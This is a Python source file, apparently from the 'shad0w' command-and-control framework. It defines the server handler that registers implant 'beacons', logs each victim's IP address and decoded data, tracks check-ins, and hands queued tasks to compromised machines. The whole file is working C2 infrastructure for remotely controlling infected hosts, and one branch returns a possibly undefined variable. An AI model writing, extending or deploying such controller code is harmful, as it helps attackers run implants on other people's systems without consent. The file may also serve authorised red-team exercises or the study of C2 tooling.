import sys
import base64
from datetime import datetime

import tools
from responce_builder import Builder

class Handler(object):

    def __init__(self, shad0w):

        super(Handler, self).__init__()
        self.shad0w = shad0w

        # for building responces
        self.builder = Builder(shad0w)
    
    def task_beacon(self, request):

        # get the beacon id from the beacon
        # print(request.get_json(force=True))
        jdata = request.get_json(force=True)

        # print("jdata: ", jdata)
        beacon_id, data = tools.get_data_from_json(jdata)

        # only if were given an id by the beacon
        if beacon_id:
            # update the ping
            try:
                self.shad0w.beacons[beacon_id]["last_checkin"]     = str(datetime.now())
                self.shad0w.beacons[beacon_id]["last_checkin_raw"] = datetime.now()
            except KeyError: pass

            try:
                # if the beacon isnt just checking in to give us
                # data then build a responce to give the beacon
                if beacon_id not in self.shad0w.beacons.keys():
                    return self.register_beacon(request)

                if (data == ""):
                    # get the current task
                    tasklist = self.shad0w.beacons[beacon_id]["task"]
                    # build the responce
                    task     = self.builder.build(beacon_id=beacon_id, task=tasklist, args=None)
                    # clear the task
                    self.shad0w.beacons[beacon_id]["task"] = None
                    # inform user
                    self.shad0w.debug.log(f"Beacon ({beacon_id}) received task", log=True)
                    return task

                # check if the data is for the current beacon
                if beacon_id == self.shad0w.current_beacon:
                    # check if we should display the data
                    callback = self.shad0w.beacons[beacon_id]["callback"]
                    return callback(self.shad0w, data)

                # another session has returned data
                if beacon_id != self.shad0w.current_beacon:
                    return task

            except:
                # there aint a task, so tell em that
                return self.builder.build(beacon_id=beacon_id, task=None)
        else:
            # ignore
            return self.builder.build(blank=True)

    def register_beacon(self, request):
            # register a new beacon
            # get the info from the initial request an store it
            # just ignore if the request isnt correct

            if request.method == "POST":

                jdata = request.get_json(force=True)
                beacon_id, data = tools.get_data_from_json(jdata)
                

                if beacon_id:
                    # init the new beacons dict
                    self.shad0w.beacons[beacon_id]                 = {}

                    # setup the file serve dict
                    self.shad0w.beacons[beacon_id]["serve"]        = {}

                    # add the ip to that dict
                    self.shad0w.beacons[beacon_id]["ip_addr"]      = request.remote_addr

                    # increase the beacon count + set beacon num
                    self.shad0w.beacon_count                       += 1
                    self.shad0w.beacons[beacon_id]["num"]          = self.shad0w.beacon_count

                    self.shad0w.beacons[beacon_id]["last_checkin"]     = str(datetime.now())
                    self.shad0w.beacons[beacon_id]["last_checkin_raw"] = datetime.now()

                    data = base64.b64decode(data)
                    #data = data.decode("utf-8")
                    self.shad0w.debug.log(f"Beacon: {beacon_id}@{request.remote_addr} \n(DATA: {data})\n", log=True)

                    # give the beacon there id, this is how we will identify them now
                    return "REGOK"

                else:
                    self.shad0w.debug.log("invalid register request")
                    return self.builder.build(blank=True)
            else:
                self.shad0w.debug.log("invaild http method for register")
                return self.builder.build(blank=True)

    def blank_page(self):
        # does what the function says
        return self.builder.build(blank=True)
